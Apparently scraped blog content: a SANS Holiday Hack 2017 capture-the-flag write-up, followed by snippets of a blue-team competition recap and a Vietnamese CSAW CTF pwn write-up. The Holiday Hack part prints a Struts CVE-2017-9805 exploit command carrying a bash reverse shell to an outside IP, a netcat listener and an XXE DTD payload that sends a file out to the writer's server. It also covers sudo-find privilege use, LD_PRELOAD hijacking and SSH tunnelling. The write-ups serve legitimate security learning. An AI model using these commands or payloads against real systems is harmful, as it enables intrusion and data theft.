0.0 18248 3288 pts/0 S 06:32 0:00 /bin/bashelf 18 0.5 0.0 71468 26544 pts/0 S 06:32 0:00 /sbin/kworkerelf 100 0.0 0.0 34424 2800 pts/0 R+ 06:33 0:00 ps auxI then referred to the hint on Sparkle tweet: aliaself@f22c16457eec:~$ aliasalias alert=&#39;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;amp;&amp;amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#39;\\&#39;&#39;s/^\\s*[0-9]\\+\\s*//;s/[;&amp;amp;|]\\s*alert$//&#39;\\&#39;&#39;)&quot;&#39;alias egrep=&#39;egrep --color=auto&#39;alias fgrep=&#39;fgrep --color=auto&#39;alias grep=&#39;grep --color=auto&#39;alias kill=&#39;true&#39;alias killall=&#39;true&#39;alias l=&#39;ls -CF&#39;alias la=&#39;ls -A&#39;alias ll=&#39;ls -alF&#39;alias ls=&#39;ls --color=auto&#39;alias pkill=&#39;true&#39;alias skill=&#39;true&#39;So there was an alias of kill, making the command useless. I just needed to unalias these and kill the process easilyelf@f22c16457eec:~$ unalias -aelf@f22c16457eec:~$ aliaself@f22c16457eec:~$ kill -9 `pidof santaslittlehelperd`elf@f22c16457eec:~$ ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDelf 1 0.0 0.0 18028 2764 pts/0 Ss 06:31 0:00 /bin/bash /sbin/initelf 12 0.0 0.0 18248 3288 pts/0 S 06:32 0:00 /bin/bashelf 192 0.0 0.0 34424 2912 pts/0 R+ 06:34 0:00 ps auxTHERE’S SNOW PLACE LIKE HOMETrain Startup ______ .-&quot;&quot;&quot;&quot;.._&#39;. _,## _..__ |.-&quot;&quot;&quot;-.| | _,##&#39;`-._ (_____)||_____|| |_,##&#39;`-._,##&#39;` _| |.;-&quot;&quot;-. | |#&#39;`-._,##&#39;` _.;_ `--&#39; `\\ \\ |.&#39;`\\._,##&#39;` /.-.\\ `\\ |.-&quot;;.`_, |##&#39;` |\\__/ | _..;__ |&#39;-&#39; / &#39;.____.&#39;_.-`)\\--&#39; /&#39;-&#39;` //||\\\\(_.-&#39;_,&#39;-&#39;` (`-...-&#39;)_,##&#39;` jgs _,##`-..,-;##` _,##&#39;`-._,##&#39;` _,##&#39;`-._,##&#39;` `-._,##&#39;`My name is Pepper Minstix, and I need your help with my plight.I&#39;ve crashed the Christmas toy train, for which I am quite contrite.I should not have interfered, hacking it was foolish in hindsight.If you can get it running again, I will reward you with a gift of delight.total 444-rwxr-xr-x 1 root root 454636 Dec 7 18:43 trainstartupWe are prompted to run a binary. Let’s see which architecture this binary is:elf@f533c87441b9:~$ file trainstartup trainstartup: ELF 32-bit LSB executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not strippedSo this is an ARM binary. There is qemu-arm on the machine. Just gotta use itelf@f533c87441b9:~$ qemu-arm ./trainstartup Merry Christmas Merry Christmasv&amp;gt;*&amp;lt;^/o\\/ \\ @.·/~~ \\ ./ ° ~~ \\ · . / ~~ \\ ◆ · / ° ~~\\ · 0/~~ \\ .─··─ · o /° ~~ .*· · . \\ ├──┼──┤ │ ──┬─°─┬─°─°─°─ └──┴──┘ ≠==≠==≠==≠==──┼──=≠ ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠ │ /└───┘\\┌───┐ ┌┐ └───┘ /▒▒▒▒ ≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠You did it! Thank you!BLUMBLES BOUNCEWeb Log ._ _. (_) (_) &amp;lt;&amp;gt; \\ / &amp;lt;&amp;gt; .\\::/. \\_\\/ \\/_/ .:. _.=._\\\\//_.=._ \\\\// .. \\o/ .. &#39;=&#39; //\\\\ &#39;=&#39; _&amp;lt;&amp;gt;_\\_\\&amp;lt;&amp;gt;/_/_&amp;lt;&amp;gt;_ :o| | |o: &#39;/::\\&#39; &amp;lt;&amp;gt; / /&amp;lt;&amp;gt;\\ \\ &amp;lt;&amp;gt; ~ &#39;. &#39; .&#39; ~ (_) (_) _ _ _ //\\\\ _ &amp;gt;O&amp;lt; &#39; &#39; /_/ \\_\\ / /\\ /\\ \\ _ .&#39; . &#39;. _ \\\\// &amp;lt;&amp;gt; / \\ &amp;lt;&amp;gt; :o| | |o: /\\_\\\\&amp;gt;&amp;lt;//_/\\ &#39;&#39; /o\\ &#39;&#39; &#39;.| |.&#39; \\/ //&amp;gt;&amp;lt;\\\\ \\/ &#39;:&#39; . ~~\\ /~~ . _//\\\\_jgs _\\_._\\/_._/_ \\_\\ /_/ / &#39; /\\ &#39; \\ \\o/ o &#39; __/ \\__ &#39; _o/.:|:.\\o_ o : o &#39; .&#39;| |&#39;. .\\:|:/. &#39;.\\&#39;/.&#39; . -=&amp;gt;&amp;gt;::&amp;gt;o&amp;lt;::&amp;lt;&amp;lt;=- :-&amp;gt;@&amp;lt;-: : _ &#39;/:|:\\&#39; _ .&#39;/.\\&#39;. &#39;.___/*\\___.&#39; o\\&#39;:|:&#39;/o o : o \\* \\ / */ /o\\ o &amp;gt;--X--&amp;lt; /*_/ \\_*\\ .&#39; \\*/ &#39;. : &#39;Minty Candycane here, I need your help straight away.We&#39;re having an argument about browser popularity stray.Use the supplied log file from our server in the North Pole.Identifying the least-popular browser is your noteworthy goal.One-liner:cat access.log | grep GET | cut -d&#39;&quot;&#39; -f 6 | sort | uniq -c | sort | head -n 1Result:elf@474bcdbda1dd:~$ ./runtoanswer Starting up, please wait......Enter the name of the least popular browser in the web log: Dillo/3.0.5That is the least common browser in the web log! Congratulations!I DON’T THINK WE’RE IN KANSAS ANYMOREChristmas Songs data analysis * .~&#39; O&#39;~.. ~&#39;O&#39;~.. ~&#39;O&#39;~..~&#39; O&#39;~..~&#39;O&#39;~. .~&#39;O&#39;~..~&#39;O&#39;~ ..~&#39;O&#39;~..~&#39;O&#39;~. .~&#39;O&#39;~..~&#39;O&#39;~..~&#39; O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.. ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.. ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39; O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~. .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~ ..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~. .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39; O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.. ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.. ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39; O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~. .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~ ..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~. .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..Sugarplum Mary is in a tizzy, we hope you can assist.Christmas songs abound, with many likes in our midst.The database is populated, ready for you to address.Identify the song whose popularity is the best.total 20684-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db-rwxr-xr-x 1 root root 5197352 Dec 7 15:10 runtoanswerTo get the ID of the most popular song, I need to count the number of likes for each unique ID and then sort them in descending order. One way to do this is:select count(songid) count, songid from likes group by songid order by count desc limit 10;sqlite&amp;gt; select count(songid) count, songid from likes group by songid order by count desc limit 10;11325|3922162|2452140|2652132|2072129|982126|902122|332120|1302117|182117|446sqlite&amp;gt; select * from songs where id = 392;392|Stairway to Heaven|Led Zeppelin|1971|&quot;Stairway to Heaven&quot; is a song by the English rock band Led Zeppelin, released in late 1971. It was composed by guitarist Jimmy Page and vocalist Robert Plant for the band&#39;s untitled fourth studio album (often called Led Zeppelin IV). It is often referred to as one of the greatest rock songs of all time.sqlite&amp;gt; .shell ./runtoanswer Starting up, please wait......Enter the name of the song with the most likes: Stairway to HeavenThat is the #1 Christmas song, congratulations!OH WAIT! MAYBE WE ARE…Shadow File Restoration \\ / --&amp;gt;*&amp;lt;-- /o\\ /_\\_\\ /_/_0_\\ /_o_\\_\\_\\ /_/_/_/_/o\\ /@\\_\\_\\@\\_\\_\\ /_/_/O/_/_/_/_\\ /_\\_\\_\\_\\_\\o\\_\\_\\ /_/0/_/_/_0_/_/@/_\\ /_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\ /_/o/_/_/@/_/_/o/_/0/_\\ jgs [___] My name is Shinny Upatree, and I&#39;ve made a big mistake.I fear it&#39;s worse than the time I served everyone bad hake.I&#39;ve deleted an important file, which suppressed my server access.I can offer you a gift, if you can fix my ill-fated redress.Restore /etc/shadow with the contents of /etc/shadow.bak, then run &quot;inspect_da_box&quot; to complete this challenge.Hint: What commands can you run with sudo?Let’s see what commands can be run with sudoelf@e4490931c153:~$ sudo -llMatching Defaults entries for elf on e4490931c153: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser elf may run the following commands on e4490931c153:Sudoers entry: RunAsUsers: elf RunAsGroups: shadow Options: !authenticate Commands: /usr/bin/findHave been tinkering with find for a while, I know it can execute commands on the results using the -exec flag, but I wasn’t sure with what privileges it will execute the commands. These are the shadow files in /etcelf@72830e537580:~$ ls -la /etc/shadow*-rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow-rw------- 1 root root 652 Nov 14 13:48 /etc/shadow--rw-r--r-- 1 root root 677 Dec 15 19:59 /etc/shadow.bakThe file we need to restore belongs to the shadow group and it has read+write group permission. My solution is to let find find this file (no pun intended) and then copy the backup shadow file over it.elf@72830e537580:~$ sudo -g shadow find /etc/shadow -exec cp /etc/shadow.bak {} \\;elf@72830e537580:~$ ls -la /etc/shadow*-rw-rw---- 1 root shadow 677 Jan 6 10:23 /etc/shadow-rw------- 1 root root 652 Nov 14 13:48 /etc/shadow--rw-r--r-- 1 root root 677 Dec 15 19:59 /etc/shadow.bakelf@72830e537580:~$ inspect_da_box ___ / __&#39;. .-&quot;&quot;&quot;-. .-&quot;&quot;-| | &#39;.&#39;. / .---. \\ / .--. \\ \\___\\ \\/ /____| | / / \\ `-.-;-(`_)_____.-&#39;._ ; ; `.-&quot; &quot;-:_,(o:==..`-. &#39;. .-&quot;-, | | / \\ / `\\ `. \\ / .-. \\ \\ \\ | Y __...\\ \\ \\ / / \\/ /\\ | | | .--&quot;&quot;--.| .-&#39; \\ &#39;.`---&#39; / \\ \\ / / |` \\&#39; _...--.; &#39;---&#39;` \\ &#39;-&#39; / jgs /_..---.._ \\ .&#39;\\\\_ `. `--&#39;` .&#39; (_) `&#39;/ (_) / `._ _.&#39;| .&#39; ``````` &#39;-...--&#39;`/etc/shadow has been successfully restored!WE’RE OFF TO SEE THE…LD_PRELOAD hooking .--._.--.--.__.--.--.__.--.--.__.--.--._.--. _(_ _Y_ _Y_ _Y_ _Y_ _)_ [___] [___] [___] [___] [___] [___] /:&#39; \\ /:&#39; \\ /:&#39; \\ /:&#39; \\ /:&#39; \\ /:&#39; \\ |:: | |:: | |:: | |:: | |:: | |:: | \\::. / \\::. / \\::. / \\::. / \\::. / \\::. / jgs \\::./ \\::./ \\::./ \\::./ \\::./ \\::./ &#39;=&#39; &#39;=&#39; &#39;=&#39; &#39;=&#39; &#39;=&#39; &#39;=&#39;Wunorse Openslae has a special challenge for you.Run the given binary, make it return 42.Use the partial source for hints, it is just a clue.You will need to write your own code, but only a line or two.total 88-rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42-rw-r--r-- 1 root root 654 Dec 15 19:59 isit42.c.unTo produce the expected result when running the binary, we’ll need to make a shared object and specify it in the LD_PRELOAD environment variable. In this shared object, we can rewrite the rand() function used in the binary isit42 so that it always return 42.hijack.c:int rand() { return 42;}Compile the above code to a shared object:gcc -o libc.so.6 -shared -fPIC hijack.celf@419cb8f6de23:~$ LD_PRELOAD=./libc.so.6 ./isit42 Starting up ... done.Calling rand() to select a random number. .-. .;;\\ || _______ __ __ _______ _______ __ _ _______ _ _ _______ ______ /::::\\|/ | || | | || | | _ || | | || || | _ | || || _ | /::::&#39;(); |_ _|| |_| || ___| | |_| || |_| || _____|| || || || ___|| | || |\\/`\\:_/`\\/| | | | || |___ | || || |_____ | || |___ | |_||_ ,__ |0_..().._0| __, | | | || ___| | || _ ||_____ || || ___|| __ | \\,`////&quot;&quot;&quot;&quot;\\\\\\\\`,/ | | | _ || |___ | _ || | | | _____| || _ || |___ | | | | | )//_ o o _\\\\( | |___| |__| |__||_______| |__| |__||_| |__||_______||__| |__||_______||___| |_| \\/|(_) () (_)|\\/ \\ &#39;()&#39; / ______ _______ _______ ___ ___ __ __ ___ _______ _:.______.;_ | _ | | || _ || | | | | | | | | | | | /| | /`\\/`\\ | |\\ | | || | ___|| |_| || | | | | |_| | | | | _____| / | | \\_/\\_/ | | \\ | |_||_ | |___ | || | | | | | | | | |_____ / |o`&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;`o| \\ | __ || ___|| || |___ | |___ |_ _| | | |_____ | `.__/ () \\__.&#39; | | | || |___ | _ || || | | | | | _____| | | | ___ ___ | | |___| |_||_______||__| |__||_______||_______| |___| |___| |_______| / \\|---| |---|/ \\ | (|42 | () | DA|) | _ ___ _______ \\ /;---&#39; &#39;---;\\ / | | | || | `` \\ ___ /\\ ___ / `` | |_| ||____ | `| | | |` | | ____| | jgs | | | | |___ || ______| ___ _._ |\\|\\/||\\/|/| _._ | || |_____ | | / .-\\ |~~~~||~~~~| /-. \\ |___||_______||___| | \\__.&#39; || &#39;.__/ | `---------&#39;&#39;---------` Congratulations! You&#39;ve won, and have successfully completed this challenge.Finding Pages of the Great Book1. Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?This is done during the game. The title of the page is About This Book.2. Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball’s passwordFor hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.tl;dr: The topic of the page is On the topic of Flying Animals. The password is stream_unhappy_buy_loss.Visit the Lettes to Santa application and read the source code, I encountered an interesting hidden field on line 243&amp;lt;!-- Development version --&amp;gt; &amp;lt;a href=&quot;http://dev.northpolechristmastown.com&quot; style=&quot;display: none;&quot;&amp;gt;Access Development Version&amp;lt;/a&amp;gt;Proceed to the site above and read the source code, I encountered another interesting information about the backend component of this application &amp;lt;div id=&quot;the-footer&quot;&amp;gt;&amp;lt;p class=&quot;center-it&quot;&amp;gt;Powered By: &amp;lt;a href=&quot;https://struts.apache.org/&quot;&amp;gt;Apache Struts&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;!-- Friend over at Equal-facts Inc recommended this framework--&amp;gt;So there is a chance that the application uses Apache Struts and the exploit is related to the Equifax Hack. Hint 6: That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too. Hint 7: Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn’t break. I actually just checked and there are lots of different exploits out there for vulnerable systems. Here is a useful article. Hint 8: Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.In order to get a reverse shell, I need to have a public IP address.On Kali box:nc -lvp 443To exploit:python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders/542 -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;public-ip-goes-here&amp;gt;/443 0&amp;gt;&amp;amp;1&quot;It took me a long time after getting the shell to find the password because I overlooked the result coming from grep and things doesn’t work well over this netcat shell. I decided to setup persistence and upgraded my shell using msfvenom reverse_tcp shell.While trying to get Alabaster Snowball’s password, the only place I can think of to have password is the tomcat manager. The application is located in /opt/apache-tomcat. I looked into tomcat_users.xml but no luck. After a few hours trying to grep with keywords like pass, password, alabaster, I was able to find the password in apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class.public class Connect { final String host = &quot;localhost&quot;; final String username = &quot;alabaster_snowball&quot;; final String password = &quot;stream_unhappy_buy_loss&quot;; String connectionURL = &quot;jdbc:mysql://&quot; + host + &quot;:3306/db?user=;password=&quot;; Connection connection = null; Statement statement = null;Password: stream_unhappy_buy_lossNote on this part: The netcat shell initially had really limited capabilities. I needed to change the PATH environment variable to be able to use more commands The file GreatBookPage2.pdf was right on the root of https://l2s.northpolechristmastown.com/. I didn’t figure that out until I got the shell and was poking around with the application.NEVER HARDCODE PASSWORDS!3. The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?For hints, please see Holly Evergreen in the Cryokinetic Magic Level.tl;dr: The file share name is FileStor.I made a mistake on this part, which took me a while to figure out the correct smb server. I read over the hint about host discovery and did a normal nmap scan, which is sure to miss the correct smb server.The right way to do the nmap was:nmap -v -PS445 10.142.0.0/24Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)Host is up (0.00056s latency).Not shown: 996 filtered portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds3389/tcp open ms-wbt-serverNmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)Host is up (0.00018s latency).Not shown: 995 closed portsPORT STATE SERVICE80/tcp open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds3389/tcp open ms-wbt-serverThe correct smb server is 10.142.0.7. Since the victim machine (in #2) doesn’t have smbclient on it, I need to setup a SSH port forward so that I can access the share from my kali box.ssh -L 445:10.142.0.7:445 alabaster_snowball@dev.northpolechristmastown.comI am then able to list the shares.smbclient -L 127.0.0.1 -U alabaster_snowballWARNING: The &quot;syslog&quot; option is deprecatedEnter WORKGROUP\\alabaster_snowball&#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share FileStor Disk IPC$ IPC Remote IPCReconnecting with SMB1 for workgroup listing.Connection to 127.0.01 failed (Error NT_STATUS_CONNECTION_REFUSED)Failed to connect with SMB1 -- no workgroup availableThe files are stored in FileStorsmbclient \\\\\\\\127.0.0.1\\\\FileStor -U alabaster_snowballsmb: \\&amp;gt; ls . D 0 Mon Jan 8 14:31:53 2018 .. D 0 Mon Jan 8 14:31:53 2018 BOLO - Munchkin Mole Report.docx A 255520 Wed Dec 6 21:44:17 2017 GreatBookPage3.pdf A 1275756 Mon Dec 4 19:21:44 2017 MEMO - Password Policy Reminder.docx A 133295 Wed Dec 6 21:47:28 2017 Naughty and Nice List.csv A 10245 Thu Nov 30 19:42:00 2017 Naughty and Nice List.docx A 60344 Wed Dec 6 21:51:25 2017 13106687 blocks of size 4096. 9624205 4. Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?Pepper Minstix provides some hints for this challenge on the There’s Snow Place Like Home Level.I didn’t finish this one. However, I did found interesting stuffs.According to the hints, there is something to do with hiding things from search engines. I then proceeded to check out robots.txtUser-agent: *Disallow: /cookie.txtcookie.txt//FOUND THESE FOR creating and validating cookies. Going to use this in node js function cookie_maker(username, callback){ var key = &#39;need to put any length key in here&#39;; //randomly generates a string of 5 characters var plaintext = rando_string(5) //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out. var ciphertext = aes256.encrypt(key, plaintext).replace(/\\=/g,&#39;&#39;); //Setting the values of the cookie. var acookie = [&#39;IOTECHWEBMAIL&#39;,JSON.stringify({&quot;name&quot;:username, &quot;plaintext&quot;:plaintext, &quot;ciphertext&quot;:ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }] return callback(acookie); }; function cookie_checker(req, callback){ try{ var key = &#39;need to put any length key in here&#39;; //Retrieving the cookie from the request headers and parsing it as JSON var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL); //Retrieving the cipher text var ciphertext = thecookie.ciphertext; //Retrievingin the username var username = thecookie.name //retrieving the plaintext var plaintext = aes256.decrypt(key, ciphertext); //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key if (plaintext === thecookie.plaintext) { return callback(true, username); } else { return callback(false, &#39;&#39;); } } catch (e) { console.log(e); return callback(false, &#39;&#39;); } };6. The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.tl;dr: The title of the page is The Dreaded Inter-dimensional Tornadoes.For this part, I also needed to do a SSH tunnel to access the site from my localhost. Visiting the site, We are presented with a web application with the following functionalities: Upload and display an XML file with the corresponding fields: http://eaas.northpolechristmastown.com/Home/DisplayXML Reset the XML file to the default one: http://eaas.northpolechristmastown.com/Home/CreateElfs A sample XML file at: http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xmlFollowing the hints, I carried out a XXE with DTD exploit on the application. This time, I need a public IP address again so that the application is able to access the malicious DTD from my server. The setup goes as following: A malicious DTD is accessible on my public server: pwn.dtd: &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!ENTITY % stolendata SYSTEM &quot;file:///c:/greatbook.txt&quot;&amp;gt; &amp;lt;!ENTITY % inception &quot;&amp;lt;!ENTITY &amp;amp;#x25; sendit SYSTEM &#39;http://&amp;lt;public-ip-goes-here&amp;gt;:8000/?%stolendata;&#39;&amp;gt;&quot;&amp;gt; The malicious xml file to be uploaded to the application: elfdata.xml: &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE demo [ &amp;lt;!ELEMENT demo ANY &amp;gt; &amp;lt;!ENTITY % extentity SYSTEM &quot;http://&amp;lt;public-ip-goes-here&amp;gt;:8000/pwn.dtd&quot;&amp;gt; %extentity; %inception; %sendit; ] &amp;gt; &amp;lt;Elf&amp;gt; &amp;lt;Elf&amp;gt; &amp;lt;ElfID&amp;gt;1&amp;lt;/ElfID&amp;gt; &amp;lt;ElfName&amp;gt;x64&amp;lt;/ElfName&amp;gt; &amp;lt;Contact&amp;gt;13371337&amp;lt;/Contact&amp;gt; &amp;lt;DateOfPurchase&amp;gt;11/29/3017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt; &amp;lt;Picture&amp;gt;2.png&amp;lt;/Picture&amp;gt; &amp;lt;Address&amp;gt;here&amp;lt;/Address&amp;gt; &amp;lt;/Elf&amp;gt; &amp;lt;/Elf&amp;gt; After uploading the malicious xml file to the application, I was able to see the content of C:\\greatbook.txt in my web log on my server:Visit the URL to obtain page 6 of the great book!Things I’ve learned in this challenge How to do SSH tunnel. XXE, DTD and how to do a simple XXE with DTD. Parsing data from the command line. This is a great one.And more importantly, the non-technical lessons Look carefully. Small but critial details are easy to overlook. I overlook many things: the hints for the correct nmap scan, the grep result for the password. They were all important and what I gotta pay for is time. Play with exploits to understand it. NEVER HARDCODE YOUR PASSWORD, JUST DON’T" }, { "title": "UB Lockdown V3", "url": "/posts/UB-Lockdown-v3/", "categories": "Incident Response", "tags": "incident response, blue team, rit, ccdc", "date": "2017-12-05 12:15:24 +0800", "snippet": "The weekend before Thanksgiving, I had the chance to play at Lockdown v3, an incident response competition held at University of Buffalo by UBNetDef.Overview This is a defense-only competition There are 6 people per team. Each team is given access to an infrastructure with basic components of an enterprise network: Windows and Linux client machines Web server(s) Active Directory/DNS server(s) FTP server Mail server Databases A router. In this competition, it is a pfSense router. While blue teams (competitors) trying to defend the infrastructure under the attack of red team, blue teams have to complete technical and business tasks (called injects) within a certain amount of time. This increase significantly the pressure of the competition since the scoring are 50/50 for up-time and injects. During the competition, there are meeting between team captain and C-level people for information inquiry about the work progress. Blue teams are required to turn in an incident response report as the final inject at the end of the competition.Competition TimeMy responsibilities in a nutshell: Keep the web servers up and running and maintain the communication between the web application and the databases. Keep the Linux clients ping-able from the scoring engine. Keep things clean and properly configured. Record red-team activities for incident reporting.I started out by changing the default passwords on all the machines that I was on. Firstly, I changed password of the root users and users that are used to login to other machines to avoid password reuse. However, I stopped changing the passwords when I realized that there were so many users and I couldn’t figure out a way to automate this process without hard-coding it. I didn’t even proceed to audit those users. This is a huge mistake.I tried to deploy my firewall script on the machines serveral times. It didn’t work perfectly. I ended up taking them down, leaving the machines without firewall. They did not get hit hard until the end of the competition, when red team tried to burn the scoreboard. Still, it is another big mistake where I could have avoided by better preparation.Here are some of my findings before red team burning the scoreboard: Backdoor in ~/.bashrc that filters out red-team activities from the output of commands like netstat, ps. Reverse shell backdoor in /root Backdoor ssh-key that allow red-team to login without password.Towards the end of the competition, red-team attempted to delete the host routing table on the Linux clients, making it un-ping-able from the scoring engine. The solution was to rebuild the routing table. It took me a while as I didn’t expect to work with host routing table. This is a new thing that I’ve learned during the competition.Lesson Learnedtl;dr: Firewalls ftw. Don’t rush. Know what you do. Have a plan, stick with it. Look carefully. Change default credentials. There is a potato out there died for each of the unchanged credential.Gameplay IF YOU HAVE A PLAN, STICK WITH IT. IF NOT, MAKE ONE, AND STICK WITH IT: I had a plan. I even told myself that I would be panicking during the competition and that’s what the 5-minute plan was for. I ended up carrying out portions of the plans in no order. That made me panic even worse towards the end of the competition. It is easy to overlook obvious things when being under pressure. I skipped things that I was supposed to investigate: ansible scripts, redundant services that are actually backdoors, .bashrc, aliases, all kind of things in this planet. There is a lot going on this kind of competition and even in real life situation. For me, it is often difficult to distinguish between malicious and non-malicious files/processes/configurations/etc during the competition and at that time, I did not know what to do with those things and proceeded to do research on things that I could have spent time learning before the competition. I think one of the best way to truly understand something is to build it from scratch and install components and monitor the changes in the systems. In that way, I can figure out different “states” of the systems, and whether something is malicious or not.The techy bits CHANGE DEFAULT PASSWORDS: Just change it. If there’s too much work, try to find a way to automate the process. Have a working firewall script. My scripts break on all the competitions that I have ever been to. The scored web application communicates with the databases. When the databases are down, we lose points for the web application as well. This means it’s not about just defending separate machines, but keeping the communication between the components is also critical. Monitoring file integrity is critical. Check for PAM backdoor." }, { "title": "CSAW CTF 2017 Qualification", "url": "/posts/CSAW-CTF-17-Qual/", "categories": "CTF", "tags": "ctf, reversing, pwn, radare2", "date": "2017-09-21 11:48:01 +0800", "snippet": "This is the write-up for challenges I have done in CSAW CTF Qualification 2017pwn: pilot (75 pts.)English version hereVietnameseNăm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não (quangltm và anh tuanit96), mình đã quẩy được vài bài khá cơ bản.Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản. Đầu tiên mình xem thông tin file này:➜ file pilotpilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, strippedNhư vậy đây là file ELF 64-bit đã bị stripped. Debug không thôi thì sẽ rất thốn, nhưng lát nữa mình sẽ giới thiệu 1 tool cực hay mà mình tìm thấy để giúp việc debug stripped binaries đỡ thốn hơn 10000 lần.Tiếp theo chạy checksec kiểm tra thì thấy binary tắt gần hết bảo vệ, còn mỗi Partial RELRO➜ checksec pilot [*] &#39;/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segmentsChạy chương trình ra output như sau:➜ ./pilot[*]Welcome DropShip Pilot...[*]I am your assitant A.I....[*]I will be guiding you through the tutorial....[*]As a first step, lets learn how to land at the designated location....[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp;amp; Medics...[*]Good Luck Pilot!....[*]Location:0x7fff0ef02250[*]Command:Rất có thể địa chỉ in ra kia là địa chỉ của input buffer. Nhưng chưa vội, mở binary lên bằng radare2 và xem các hàm nào…➜ r2 -A pilot [x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze len bytes of instructions for references (aar)[x] Analyze function calls (aac)[ ] [*] Use -AA or aaaa to perform additional experimental analysis.[x] Constructing a function name for fcn.* and sym.func.* functions 